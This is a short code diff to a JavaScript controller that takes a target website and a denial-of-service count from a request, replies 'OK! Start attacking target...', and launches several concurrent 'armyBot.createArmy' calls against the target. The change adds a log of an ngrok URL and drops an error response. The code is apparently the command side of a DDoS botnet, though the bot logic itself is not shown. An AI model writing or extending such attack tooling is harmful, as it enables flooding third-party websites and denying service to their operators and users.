@@ -16,7 +16,8 @@ class ControlControllers {
         try {
            const {websiteTarget, numberDos} = req.body
            res.end('OK! Start attacking target...')
-           
+           console.log(process.env.URL_NGROK);
+
             await Promise.all([
                armyBot.createArmy(websiteTarget, 25, numberDos),
                armyBot.createArmy(websiteTarget, 25, numberDos),
@@ -38,7 +39,6 @@ class ControlControllers {
 
         } catch (error) {
             console.log(error);
-            res.status(500).send('Something wrong!')
         }
     }
 
